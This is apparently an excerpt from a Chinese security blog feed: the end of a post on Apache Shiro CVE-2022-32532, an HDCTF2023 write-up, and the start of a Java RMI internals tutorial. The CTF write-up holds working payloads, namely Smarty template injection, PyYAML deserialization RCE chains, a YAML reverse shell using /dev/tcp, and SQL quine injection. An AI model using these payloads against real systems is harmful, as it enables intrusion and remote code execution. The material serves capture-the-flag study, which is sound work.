BUG，并非安全风险，而官方的通告又致谢了另外一个安全从业者。</li><li>我翻了所有的更新代码，确实没找到其他类似漏洞修复的地方，因为 shiro 一般修绕过的时候都会给出新的 testcase，确实没找到别的。</li></ul><h2 id="CVE-2022-32532"><a href="#CVE-2022-32532" class="headerlink" title="CVE-2022-32532"></a>CVE-2022-32532</h2><h3 id="漏洞信息-11"><a href="#漏洞信息-11" class="headerlink" title="漏洞信息"></a>漏洞信息</h3><table><thead><tr><th align="left">漏洞信息</th><th align="left">详情</th></tr></thead><tbody><tr><td align="left">漏洞编号</td><td align="left"><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-32532">CVE-2022-32532</a></td></tr><tr><td align="left">影响版本</td><td align="left">shiro &lt; 1.9.1</td></tr><tr><td align="left">漏洞描述</td><td align="left">RegexRequestMatcher 在使用带有 &quot;.&quot; 的正则时，可能会导致权限绕过</td></tr><tr><td align="left">漏洞关键字</td><td align="left">RegexRequestMatcher | . | 绕过</td></tr><tr><td align="left">漏洞补丁</td><td align="left"><a href="https://github.com/apache/shiro/commit/4a20bf0e995909d8fda58f9c0485ea9eb2d43f0e">Commit-4a20bf0</a></td></tr><tr><td align="left">相关链接</td><td align="left"><a href="https://github.com/4ra1n/CVE-2022-32532">CVE-2022-32532</a> <a href="https://lists.apache.org/thread/y8260dw8vbm99oq7zv6y3mzn5ovk90xh">https://lists.apache.org/thread/y8260dw8vbm99oq7zv6y3mzn5ovk90xh</a> <a href="https://tanzu.vmware.com/security/cve-2022-22978">https://tanzu.vmware.com/security/cve-2022-22978</a></td></tr></tbody></table><h3 id="漏洞详解-10"><a href="#漏洞详解-10" class="headerlink" title="漏洞详解"></a>漏洞详解</h3><p>此漏洞原理为 CVE-2022-22978 ，是当 RegexRequestMatcher 使用了 &quot;.&quot; 来进行正则匹配时，导致的权限绕过。Spring Security 报了一次，跑到 shiro 里再报一次，很合理。</p><p>漏洞的成因很简单，就是 RegexRequestMatcher 默认使用的正则匹配的 &quot;.&quot; 不会匹配换行符，因此可以使用在路径中添加换行符来绕过权限匹配。这里不再重复漏洞原理，主要是正则的使用问题，简单复现一下。</p><p>漏洞环境由漏洞报送者 4ra1n 师傅发布在 <a href="https://github.com/4ra1n/CVE-2022-32532">github</a> 了，这里我们就使用他的环境。</p><p>环境中将鉴权组件配置为了自定义的 <code>AccessControlFilter</code> 实现类，并将 PatternMatcher 配置为了 RegExPatternMatcher，在之前的 shiro CVE 中，我们都是使用 shiro 自己默认的 AntPathMatcher 的特性来绕过鉴权。</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/1656470418237.png" alt="img"></p><p>而 <code>org.apache.shiro.util.RegExPatternMatcher</code> 是使用了 <code>Pattern.compile(pattern)</code> 来进行正则匹配。</p><p><img src="https://su18.org/post-images/1656470507252.png" alt="img"></p><p>然后将自定义的实现类配置在 SpringShiroFilter 中。</p><p><img src="https://su18.org/post-images/1656470841496.png" alt="img"></p><p>此时访问 <code>/permit/aa</code> 时，被正则匹配拦住：</p><p><img src="https://su18.org/post-images/1656471971745.png" alt="img"></p><p>访问 <code>/permit/a%0aa</code> 时，无法匹配到，绕过鉴权：</p><p><img src="https://su18.org/post-images/1656472008605.png" alt="img"></p><p>这中间差异性之前的漏洞也描述过了，不再重复。</p><h3 id="漏洞修复-10"><a href="#漏洞修复-10" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>Shiro 在 <a href="https://github.com/apache/shiro/commit/6bcb92e06fa588b9c7790dd01bc02135d58d3f5b">Commit-6bcb92e</a> 中修复了此问题。可以看到为 RegexRequestMatcher 默认添加了 <code>Pattern.DOTALL</code> 选项，并同时添加了大小写敏感的选项。</p><p><img src="https://su18.org/post-images/1656469745691.png" alt="img"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>能写(chao)完这篇文章首先很感谢su18师傅写的四篇关于shiro安全的博客，毕竟这东西要查重的话我的查重率估计在80%以上（</p><p>另外对于shiro的漏洞，感觉看我之后只有两种漏洞，shiro550和路径解析问题导致的权限绕过（不过CVE-2014-0074好像不属于这两种，但是我也没看</p><p>shiro550没什么好说的，很简单的链子，至于它的强化版shiro721在我看来漏洞利用实在是有点繁琐，不过GitHub似乎是有一键打的攻击。</p><p>而对于路径解析的这些漏洞，多数是由于 shiro 的处理逻辑有误，或和中间件、其他框架的处理逻辑不一致导致的安全问题，通常对各种框架和中间件的版本要求都很严格。</p>]]></content>
      
      
      
        <tags>
            
            <tag> web学习 </tag>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HDCTF2023 WP</title>
      <link href="/2023/04/23/HDCTF2023-WP/"/>
      <url>/2023/04/23/HDCTF2023-WP/</url>
      
        <content type="html"><![CDATA[<p>海南大学的比赛，六个web就出了四个，java的题目还是一窍不通。我是菜鸟，想寄就寄</p><h1 id="Welcome-To-HDCTF-2023"><a href="#Welcome-To-HDCTF-2023" class="headerlink" title="Welcome To HDCTF 2023"></a>Welcome To HDCTF 2023</h1><p>直接改js，没啥好说的</p><h1 id="SearchMaster"><a href="#SearchMaster" class="headerlink" title="SearchMaster"></a>SearchMaster</h1><p>smarty的模板注入，看出题人的原意是用Smarty 4.1.0的CVE打，但是实际上好像是个payload都能用。</p><p>比如{if system(&quot;cat /f*&quot;)}{/if}</p><h1 id="YamiYami"><a href="#YamiYami" class="headerlink" title="YamiYami"></a>YamiYami</h1><p>是之前国赛的一个题改的，但是在读源码的地方加了过滤</p><p>比赛的时候没读出来源码，不过看见了个非预期</p><p>直接读file:///proc/1/environ</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230423134729860.png" alt="image-20230423134729860"></p><p>接下来说一下预期解</p><p>首先是这个过滤的问题</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230423135156061.png" alt="image-20230423135156061"></p><p>可以通过对file后边的内容进行双重url编码进行绕过</p><p>得到源码之后前半部分其实跟国赛那个差不多</p><pre class="language-python" data-language="python"><code class="language-python">#encoding:utf-8import osimport re, random, uuidfrom flask import *from werkzeug.utils import *import yamlfrom urllib.request import urlopenapp &#x3D; Flask(__name__)random.seed(uuid.getnode())app.config[&#39;SECRET_KEY&#39;] &#x3D; str(random.random()*233)app.debug &#x3D; FalseBLACK_LIST&#x3D;[&quot;yaml&quot;,&quot;YAML&quot;,&quot;YML&quot;,&quot;yml&quot;,&quot;yamiyami&quot;]app.config[&#39;UPLOAD_FOLDER&#39;]&#x3D;&quot;&#x2F;app&#x2F;uploads&quot;@app.route(&#39;&#x2F;&#39;)def index():    session[&#39;passport&#39;] &#x3D; &#39;YamiYami&#39;    return &#39;&#39;&#39;    Welcome to HDCTF2023 &lt;a href&#x3D;&quot;&#x2F;read?url&#x3D;https:&#x2F;&#x2F;baidu.com&quot;&gt;Read somethings&lt;&#x2F;a&gt;    &lt;br&gt;    Here is the challenge &lt;a href&#x3D;&quot;&#x2F;upload&quot;&gt;Upload file&lt;&#x2F;a&gt;    &lt;br&gt;    Enjoy it &lt;a href&#x3D;&quot;&#x2F;pwd&quot;&gt;pwd&lt;&#x2F;a&gt;    &#39;&#39;&#39;@app.route(&#39;&#x2F;pwd&#39;)def pwd():    return str(pwdpath)@app.route(&#39;&#x2F;read&#39;)def read():    try:        url &#x3D; request.args.get(&#39;url&#39;)        m &#x3D; re.findall(&#39;app.*&#39;, url, re.IGNORECASE)        n &#x3D; re.findall(&#39;flag&#39;, url, re.IGNORECASE)        if m:            return &quot;re.findall(&#39;app.*&#39;, url, re.IGNORECASE)&quot;        if n:            return &quot;re.findall(&#39;flag&#39;, url, re.IGNORECASE)&quot;        res &#x3D; urlopen(url)        return res.read()    except Exception as ex:        print(str(ex))    return &#39;no response&#39;def allowed_file(filename):   for blackstr in BLACK_LIST:       if blackstr in filename:           return False   return True@app.route(&#39;&#x2F;upload&#39;, methods&#x3D;[&#39;GET&#39;, &#39;POST&#39;])def upload_file():    if request.method &#x3D;&#x3D; &#39;POST&#39;:        if &#39;file&#39; not in request.files:            flash(&#39;No file part&#39;)            return redirect(request.url)        file &#x3D; request.files[&#39;file&#39;]        if file.filename &#x3D;&#x3D; &#39;&#39;:            return &quot;Empty file&quot;        if file and allowed_file(file.filename):            filename &#x3D; secure_filename(file.filename)            if not os.path.exists(&#39;.&#x2F;uploads&#x2F;&#39;):                os.makedirs(&#39;.&#x2F;uploads&#x2F;&#39;)            file.save(os.path.join(app.config[&#39;UPLOAD_FOLDER&#39;], filename))            return &quot;upload successfully!&quot;    return render_template(&quot;index.html&quot;)@app.route(&#39;&#x2F;boogipop&#39;)def load():    if session.get(&quot;passport&quot;)&#x3D;&#x3D;&quot;Welcome To HDCTF2023&quot;:        LoadedFile&#x3D;request.args.get(&quot;file&quot;)        if not os.path.exists(LoadedFile):            return &quot;file not exists&quot;        with open(LoadedFile) as f:            yaml.full_load(f)            f.close()        return &quot;van you see&quot;    else:        return &quot;No Auth bro&quot;if __name__&#x3D;&#x3D;&#39;__main__&#39;:    pwdpath &#x3D; os.popen(&quot;pwd&quot;).read()    app.run(        debug&#x3D;False,        host&#x3D;&quot;0.0.0.0&quot;    )    print(app.config[&#39;SECRET_KEY&#39;])</code></pre><p>首先要先伪造session去进入/boogipop路由</p><p>这里是伪随机<code>random.seed(uuid.getnode())</code>，uuid.getnode()得到的是计算机的硬件地址，也就是在/sys/class/net/eth0/address里</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230423135744422.png" alt="image-20230423135744422"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230423140323450.png" alt="image-20230423140323450"></p><p>然后就用工具伪造session就行了</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230423144416908.png" alt="image-20230423144416908"></p><p>因为会去利用yaml.full_load去加载文件，所以后边是一个yaml的反序列化</p><p>具体可以看这两个，payload感觉是根据python源码写出来的，只会照抄（</p><p><a href="https://xz.aliyun.com/t/7923#toc-12">浅谈PyYAML反序列化漏洞 - 先知社区 (aliyun.com)</a></p><p><a href="https://www.freebuf.com/vuls/256243.html">PyYAML反序列化防御和ByPass - FreeBuf网络安全行业门户</a></p><p><a href="https://boogipop.com/2023/03/02/PyYAML%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">PyYaml反序列化 | Boogiepop Doesn&#39;t Laugh (boogipop.com)</a></p><p>写几个常用的payload</p><pre class="language-python" data-language="python"><code class="language-python">PyYAML版本 &lt; 5.1# python&#x2F;object&#x2F;apply链yaml.load(&#39;exp: !!python&#x2F;object&#x2F;apply:os.system [&quot;whoami&quot;]&#39;)yaml.load(&quot;exp: !!python&#x2F;object&#x2F;apply:os.system [&#39;whoami&#39;]&quot;)# 引号当然不是必须的yaml.load(&quot;exp: !!python&#x2F;object&#x2F;apply:os.system [whoami]&quot;)yaml.load(&quot;&quot;&quot;exp: !!python&#x2F;object&#x2F;apply:os.system- whoami&quot;&quot;&quot;)yaml.load(&quot;&quot;&quot;exp: !!python&#x2F;object&#x2F;apply:os.system  args: [&quot;whoami&quot;]&quot;&quot;&quot;)# command 是 os.system 的参数名yaml.load(&quot;&quot;&quot;exp: !!python&#x2F;object&#x2F;apply:os.system  kwds: &#123;&quot;command&quot;: &quot;whoami&quot;&#125;&quot;&quot;&quot;)yaml.load(&quot;!!python&#x2F;object&#x2F;apply:os.system [whoami]: exp&quot;)yaml.load(&quot;!!python&#x2F;object&#x2F;apply:os.system [whoami]&quot;)yaml.load(&quot;&quot;&quot;!!python&#x2F;object&#x2F;apply:os.system- whoami&quot;&quot;&quot;)#python&#x2F;object&#x2F;new 和 apply的payload一样 就是把apply改成new了PyYAML版本 &gt;&#x3D; 5.1在使用unsafe_load方法或是UnsafeLoader构造器时和5.1以下版本一样，但是默认使用的是FullConstructoryaml.full_load(&quot;&quot;&quot;!!python&#x2F;object&#x2F;new:typeargs:  - exp  - !!python&#x2F;tuple []  - &#123;&quot;extend&quot;: !!python&#x2F;name:exec &#125;listitems: &quot;__import__(&#39;os&#39;).system(&#39;whoami&#39;)&quot;&quot;&quot;&quot;)# 在 Python 中，当你使用 type 函数创建一个新类型时，你可以提供三个参数：类型的名称，父类的元组（如果没有父类则为空元组），以及一个包含属性和方法的字典。如果不需要传递参数给构造函数，那么第二个参数就可以是一个空元组yaml.full_load(&quot;&quot;&quot;!!python&#x2F;object&#x2F;new:str    args: []    # 通过 state 触发调用    state: !!python&#x2F;tuple      - &quot;__import__(&#39;os&#39;).system(&#39;whoami&#39;)&quot;      # 下面构造 exp      - !!python&#x2F;object&#x2F;new:staticmethod        args: []        state:           update: !!python&#x2F;name:eval          items: !!python&#x2F;name:list  # 不设置这个也可以，会报错但也已经执行成功&quot;&quot;&quot;)</code></pre><pre class="language-yaml" data-language="yaml"><code class="language-yaml">!!python&#x2F;object&#x2F;new:str    args: []    state: !!python&#x2F;tuple      - &quot;__import__(&#39;os&#39;).system(&#39;bash -c \&quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F; &lt;&amp;1\&quot;&#39;)&quot;      - !!python&#x2F;object&#x2F;new:staticmethod        args: []        state:          update: !!python&#x2F;name:eval          items: !!python&#x2F;name:list</code></pre><p>上传yaml文件之后</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230423144506389.png" alt="image-20230423144506389"></p><p>我这里不小心执行了一遍flag.sh，把flag给重写了（</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230423144520949.png" alt="image-20230423144520949"></p><h1 id="LoginMaster（Quine注入）"><a href="#LoginMaster（Quine注入）" class="headerlink" title="LoginMaster（Quine注入）"></a>LoginMaster（Quine注入）</h1><p>这题感觉挺有意思的，虽然是第五空间的原题</p><p>robots.txt会给出得到flag的条件和一些过滤，不过我这直接贴第五空间的源码吧</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phpinclude_once(&quot;lib.php&quot;);function alertMes($mes,$url)&#123;    die(&quot;&lt;script&gt;alert(&#39;&#123;$mes&#125;&#39;);location.href&#x3D;&#39;&#123;$url&#125;&#39;;&lt;&#x2F;script&gt;&quot;);&#125;function checkSql($s) &#123;    if(preg_match(&quot;&#x2F;regexp|between|in|flag|&#x3D;|&gt;|&lt;|and|\||right|left|reverse|update|extractvalue|floor|substr|&amp;|;|\\\$|0x|sleep|\ &#x2F;i&quot;,$s))&#123;        alertMes(&#39;hacker&#39;, &#39;index.php&#39;);    &#125;&#125;if (isset($_POST[&#39;username&#39;]) &amp;&amp; $_POST[&#39;username&#39;] !&#x3D; &#39;&#39; &amp;&amp; isset($_POST[&#39;password&#39;]) &amp;&amp; $_POST[&#39;password&#39;] !&#x3D; &#39;&#39;) &#123;    $username&#x3D;$_POST[&#39;username&#39;];    $password&#x3D;$_POST[&#39;password&#39;];    if ($username !&#x3D;&#x3D; &#39;admin&#39;) &#123;        alertMes(&#39;only admin can login&#39;, &#39;index.php&#39;);    &#125;    checkSql($password);    $sql&#x3D;&quot;SELECT password FROM users WHERE username&#x3D;&#39;admin&#39; and password&#x3D;&#39;$password&#39;;&quot;;    $user_result&#x3D;mysqli_query($con,$sql);    $row &#x3D; mysqli_fetch_array($user_result);    if (!$row) &#123;        alertMes(&quot;something wrong&quot;,&#39;index.php&#39;);    &#125;    if ($row[&#39;password&#39;] &#x3D;&#x3D;&#x3D; $password) &#123;    die($FLAG);    &#125; else &#123;    alertMes(&quot;wrong password&quot;,&#39;index.php&#39;);  &#125;&#125;if(isset($_GET[&#39;source&#39;]))&#123;  show_source(__FILE__);  die;&#125;?&gt;</code></pre><p>可以看到只要满足$username == &#39;admin&#39;和$row[&#39;password&#39;] === $password就能拿到flag</p><p>但是实际上会发现当username是admin的时候，不管password是什么都会报something wrong</p><p>也就是说row根本不存在，这个登录是一个空表</p><p>所以这时候就要用quine的方式让输入等于输出</p><p>Quine又叫做自产生程序，在sql注入技术中，这是一种使得输入的sql语句和输出的sql语句一致的技术，常用于一些特殊的登陆绕过sql注入中。</p><p>其实就是利用sql的replace函数进行一次次的嵌套，实现了让输入等于输出的功能</p><p><a href="https://www.cnblogs.com/zhengna/p/15917521.html">CTFHub_2021-第五空间智能安全大赛-Web-yet_another_mysql_injection（quine注入） - zhengna - 博客园 (cnblogs.com)</a></p><p><a href="https://www.anquanke.com/post/id/253570#h3-4">从三道赛题再谈Quine trick-安全客 - 安全资讯平台 (anquanke.com)</a></p><p>当我们输入的是下面这个的时候，返回的内容也是这个</p><pre class="language-sql" data-language="sql"><code class="language-sql">replace(replace(&#39;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#39;,char(34),char(39)),char(46),&#96;&#96;&#39;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#39;);</code></pre><p>但是在sql注入里，我们首先需要去闭合原有的sql语句，还要注释后面的语句，因此需要对语句进行修改。</p><pre class="language-sql" data-language="sql"><code class="language-sql">1&#39;UNION(SELECT(replace(replace(&#39;1&quot;UNION(SELECT(replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)))#&#39;,char(34),char(39)),char(46),&#39;1&quot;UNION(SELECT(replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)))#&#39;)))#</code></pre><p>替换后变为</p><pre class="language-sql" data-language="sql"><code class="language-sql">1&#39;UNION(SELECT(replace(replace(&#39;1&quot;UNION(SELECT(replace(replace(&quot;%&quot;,char(34),char(39)),char(37),&quot;%&quot;)))#&#39;,char(34),char(39)),char(46),&#39;1&quot;UNION(SELECT(replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)))#&#39;)))#</code></pre><p>简单说Quine注入的主要结构就是</p><p>replace(A,分隔符,A)</p><p>在上面那个payload中</p><pre class="language-SQL" data-language="SQL"><code class="language-SQL"> A为： 1&quot;UNION(SELECT(replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)))#而去掉了这两个A之后的payload为1&#39;UNION(SELECT(replace(replace(&#39;&#39;,char(34),char(39)),char(46),&#39;&#39;)))#  可以看到和A的结构几乎一模一样，所以Quine注入其实就是replace(A,分隔符,A)这种形式的嵌套</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RMI攻击（一）</title>
      <link href="/2023/04/21/RMI%E6%94%BB%E5%87%BB%EF%BC%88%E4%B8%80%EF%BC%89/"/>
      <url>/2023/04/21/RMI%E6%94%BB%E5%87%BB%EF%BC%88%E4%B8%80%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="RMI介绍"><a href="#RMI介绍" class="headerlink" title="RMI介绍"></a>RMI介绍</h1><p>​    RMI (Remote Method Invocation) 远程方法调用，顾名思义，它的功能就是就是实现调用远程方法</p><p>​    实现RMI的协议叫JRMP，RMI实现的过程中进行了java对象的传递，自然使用了序列化和反序列化，也自然产生了反序列化漏洞</p><p>这里介绍一下rmi的流程。</p><p>首先，rmi里有三个角色，分别是客户端、服务端以及注册中心</p><p>设计上客户端和服务端不直接通信，而是通过注册中心通信。简单理解三者的关系如下：服务端创建远程对象，并将远程对象在注册中心注册，客户端到注册中心端查找并获取对应的远程对象，最终在服务端调用其方法。</p><p>具体实现时，客户端没有直接调用服务器上的对象，也没有直接调用注册中心上的对象，而是操作一个进行网络通信的代理类叫Stub，服务端也一样有一个类似的代理类叫Skel，具体操作都是这两个代理类进行的。</p><blockquote><p>RMI 引入了两个概念，分别是 Stubs（客户端存根） 以及 Skeletons（服务端骨架），当客户端（Client）试图调用一个在远端的 Object 时，实际调用的是客户端本地的一个代理类（Proxy），这个代理类就称为 Stub，而在调用远端（Server）的目标类之前，也会经过一个对应的远端代理类，就是 Skeleton，它从 Stub 中接收远程方法调用并传递给真实的目标类。Stubs 以及 Skeletons 的调用对于 RMI 服务的使用者来讲是隐藏的，我们无需主动的去调用相关的方法。但实际的客户端和服务端的网络通信时通过 Stub 和 Skeleton 来实现的。</p></blockquote><p>整体调用时序图：</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230421192523136.png" alt="image-20230421192523136"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/1633059061409.png" alt="img"></p><h1 id="rmi-demo"><a href="#rmi-demo" class="headerlink" title="rmi demo"></a>rmi demo</h1><p>写个demo具体介绍一下rmi的利用</p><p>首先需要定义<strong>远程对象类</strong>。远程方法调用不是所有类都可以，想进行远程方法调用的类，需要实现一个继承Remote接口的接口，远程方法要抛RemoteException。先定义这个接口：</p><pre class="language-java" data-language="java"><code class="language-java">import java.rmi.Remote;import java.rmi.RemoteException;public interface IRemoteObj extends Remote &#123;    &#x2F;&#x2F; 远程方法要抛RemoteException    public String sayHello() throws RemoteException;&#125;</code></pre><p>然后去定义实现类</p><p>这个实现类在后续需要被远程调用，服务端需要把这个远程对象发布出去，因此也有条件。</p><p>这个实现类必须调用UnicastRemoteObject.exportObject方法</p><p>这里有两个选择，一个是去继承UnicastRemoteObject，然后UnicastRemoteObject的构造方法就会自动去调用UnicastRemoteObject.exportObject。另一个是直接自己去调用UnicastRemoteObject.exportObject方法。</p><p>定义好的远程对象类</p><pre class="language-java" data-language="java"><code class="language-java">import java.rmi.RemoteException;import java.rmi.server.UnicastRemoteObject;public class IRemoteObjImpl extends UnicastRemoteObject implements IRemoteObj&#123;    protected IRemoteObjImpl() throws RemoteException &#123;    &#125;    @Override    public String sayHello() throws RemoteException &#123;        String name &#x3D; this.getClass().getName();        System.out.println(name);        return name;    &#125;&#125;</code></pre><p>远程对象类定义好后，也就是说我们现在有可以发布的东西了，接下来就可以去定义服务端和客户端了，<strong>服务端</strong>一般和注册中心写在一起，做如下几件事：<br>1、首先创建远程对象，创建时也会进行远程对象的发布。<br>2、创建注册中心<br>3、将远程对象绑定到注册中心</p><pre class="language-java" data-language="java"><code class="language-java">public class RMIServer &#123;    public static void main(String[] args) throws RemoteException, AlreadyBoundException &#123;        &#x2F;&#x2F;创建远程对象        IRemoteObjImpl iRemoteObj &#x3D; new IRemoteObjImpl();        &#x2F;&#x2F;创建注册中心        Registry registry &#x3D; LocateRegistry.createRegistry(1099);        &#x2F;&#x2F;把远程对象发布到注册中心上，这里还提供了查询（lookup）、重新绑定（rebind）、接触绑定（unbind）、list（列表）的方式        registry.bind(&quot;iRemoteObj&quot;,iRemoteObj);    &#125;&#125;</code></pre><p>这里看到好像还可以用java.rmi.Naming类来实现</p><p>方式是<code>Naming.bind(&quot;rmi://localhost:1099/iRemoteObj&quot;, iRemoteObj);</code></p><p>接下来是<strong>客户端</strong>，客户端也做三件事</p><p>1、获取“注册中心”对象<br>2、利用注册中心对象获取远程对象<br>3、调用远程对象上的方法</p><pre class="language-java" data-language="java"><code class="language-java">import java.rmi.NotBoundException;import java.rmi.RemoteException;import java.rmi.registry.LocateRegistry;import java.rmi.registry.Registry;public class RMIClient &#123;    public static void main(String[] args) throws  RemoteException, NotBoundException &#123;        Registry registry &#x3D; LocateRegistry.getRegistry(&quot;127.0.0.1&quot;, 1099);        IRemoteObj remoteObj &#x3D; (IRemoteObj) registry.lookup(&quot;iRemoteObj&quot;);        String s &#x3D; remoteObj.sayHello();        System.out.println(s);    &#125;&#125;</code></pre><p>启动之后在服务端上可以看见输出的name，在客户端上也可以接收返回的name值并打印出来</p><h1 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h1><h2 id="创建远程对象"><a href="#创建远程对象" class="headerlink" title="创建远程对象"></a>创建远程对象</h2><p><code>IRemoteObjImpl iRemoteObj = new IRemoteObjImpl();</code></p><p>这行代码的作用就是创建远程对象</p><p>具体的执行过程是</p><p>首先调用IRemoteObjImpl的构造函数</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230421203350191.png" alt="image-20230421203350191"></p><p>然后就会进入UnicastRemoteObject的构造函数</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230421204727058.png" alt="image-20230421204727058"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230421204805312.png" alt="image-20230421204805312"></p><p>再进入exportObject方法，会看到UnicastServerRef类，它代表远程对象的引用。这个类继承了Dispatcher接口，代表由它分发客户端的操作给远程对象。</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230421204953544.png" alt="image-20230421204953544"></p><p>根据注释能知道这里obj是要导出的远程对象，port是导出的端口，返回值是存根，也就是stub</p><p>再跟到UnicastServerRef里</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230421205239533.png" alt="image-20230421205239533"></p><p>这里出现了一个LiveRef类，接着跟进去</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230421205623143.png" alt="image-20230421205623143"></p><p>在LiveRef的构造方法里有一个TCPEndpoint类，显然和通信有关，再继续跟</p><pre class="language-java" data-language="java"><code class="language-java">  public static TCPEndpoint getLocalEndpoint(int port) &#123;        return getLocalEndpoint(port, null, null);    &#125;public static TCPEndpoint getLocalEndpoint(int port,        RMIClientSocketFactory csf, RMIServerSocketFactory ssf) &#123;    &#x2F;*     * 查找将一个端点键映射到此客户端&#x2F;服务器套接字工厂对的本地唯一端点列表（可能为null）的特定端口。     *&#x2F;    TCPEndpoint ep &#x3D; null;    &#x2F;&#x2F; 使用localEndpoints对象对方法进行同步    synchronized (localEndpoints) &#123;        &#x2F;&#x2F; 创建一个 TCPEndpoint 实例作为端点键        TCPEndpoint endpointKey &#x3D; new TCPEndpoint(null, port, csf, ssf);        &#x2F;&#x2F; 获取本地唯一端点列表        LinkedList&lt;TCPEndpoint&gt; epList &#x3D; localEndpoints.get(endpointKey);        &#x2F;&#x2F; 获取本地主机名称        String localHost &#x3D; resampleLocalHost();        &#x2F;&#x2F; 如果本地唯一端点列表不存在        if (epList &#x3D;&#x3D; null) &#123;            &#x2F;*             * 创建新的端点列表             *&#x2F;            &#x2F;&#x2F; 创建一个 TCPEndpoint 实例，作为新的唯一端点            ep &#x3D; new TCPEndpoint(localHost, port, csf, ssf);            &#x2F;&#x2F; 创建一个 LinkedList 实例，将新唯一端点添加到其中            epList &#x3D; new LinkedList&lt;TCPEndpoint&gt;();            epList.add(ep);            &#x2F;&#x2F; 设置唯一端点的监听端口和传输协议            ep.listenPort &#x3D; port;            ep.transport &#x3D; new TCPTransport(epList);            &#x2F;&#x2F; 将端点键与新的唯一端点列表加入到 localEndpoints 对象中            localEndpoints.put(endpointKey, epList);            &#x2F;&#x2F; 如果 tcpLog 的记录级别为 BRIEF，则记录端口创建成功的日志信息            if (TCPTransport.tcpLog.isLoggable(Log.BRIEF)) &#123;                TCPTransport.tcpLog.log(Log.BRIEF,                        &quot;created local endpoint for socket factory &quot; + ssf +                        &quot; on port &quot; + port);            &#125;        &#125; else &#123;            synchronized (epList) &#123;                &#x2F;&#x2F; 获取本地唯一端点列表的最后一个唯一端点                ep &#x3D; epList.getLast();                &#x2F;&#x2F; 获取最后一个唯一端点的主机名称、端口号和传输协议                String lastHost &#x3D; ep.host;                int lastPort &#x3D;  ep.port;                TCPTransport lastTransport &#x3D; ep.transport;                &#x2F;&#x2F; 如果本地主机名称不为 null 且不等于最后一个唯一端点的主机名称                if (localHost !&#x3D; null &amp;&amp; !localHost.equals(lastHost)) &#123;                    &#x2F;*                     * 主机名称已更新；将更新的端点添加到列表中                     *&#x2F;                    &#x2F;&#x2F; 如果最后一个唯一端点的端口号已设置，则移除旧唯一端点                    if (lastPort !&#x3D; 0) &#123;                        epList.clear();                    &#125;                    &#x2F;&#x2F; 创建一个 TCPEndpoint 实例，作为新的唯一端点                    ep &#x3D; new TCPEndpoint(localHost, lastPort, csf, ssf);                    &#x2F;&#x2F; 设置唯一端点的监听端口和传输协议                    ep.listenPort &#x3D; port;                    ep.transport &#x3D; lastTransport;                    &#x2F;&#x2F; 将新唯一端点添加到列表中epList.add(ep);                   &#125;                &#125;            &#125;        &#125;        return ep;    &#125;</code></pre><p>这段代码有点难读，但是最后返回的就是一个TCPEndPoint实例</p><p>这个TCPEndPoint显然就是一个和网络请求有关的类</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230421211241357.png" alt="image-20230421211241357"></p><p>里面的属性有端口，ip之类的信息，其中的TCPTransport是真正的处理网络请求的类，这里实际上将TCPEndPoint和TCPTransport进行了绑定。</p><p>返回了一个ep变量</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230516201354198.png" alt="image-20230516201354198"></p><p>所以LiveRef里面就是放了一个TCPEndPoint。那么LiveRef可以理解为一个封装了ip、端口和一些id信息之类的辅助类。</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230516201529806.png" alt="image-20230516201529806"></p><p>现在LiveRef已经生成了</p><p>重新回到UnicastServerRef的构造函数</p><pre class="language-java" data-language="java"><code class="language-java">public UnicastServerRef(int port) &#123;    super(new LiveRef(port));&#125;</code></pre><p>这里调用了父类UnicastRef的构造函数</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230421211601165.png" 